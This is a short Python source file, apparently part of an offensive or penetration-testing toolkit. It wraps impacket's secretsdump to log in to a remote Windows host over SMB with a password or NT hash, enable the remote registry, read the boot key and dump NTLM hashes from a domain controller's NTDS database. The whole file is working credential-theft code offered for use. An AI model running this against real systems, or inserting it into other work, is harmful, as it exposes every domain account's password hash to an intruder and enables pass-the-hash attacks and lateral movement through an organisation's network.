from libs.impacket.smbconnection import SMBConnection
from libs.impacket.examples.secretsdump import RemoteOperations, NTDSHashes

class DumpSecrets:
    def __init__(self, remoteHost, username, password, domain, nthash):
        self.__remoteHost = remoteHost
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__nthash = nthash
        self.__smbConnection = None
        self.__remoteOps = None
        self.__isRemote = True
        self.__doKerberos = False
        self.__justDCNTLM = True

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteHost, self.__remoteHost)
        self.__smbConnection.login(self.__username, self.__password, self.__domain, nthash=self.__nthash)

    def dump(self):
        self.connect()
        self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos)
        self.__remoteOps.enableRegistry()
        bootKey = self.__remoteOps.getBootKey()

        NTDSFileName = None
        NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, remoteOps=self.__remoteOps, justNTLM=self.__justDCNTLM).dump()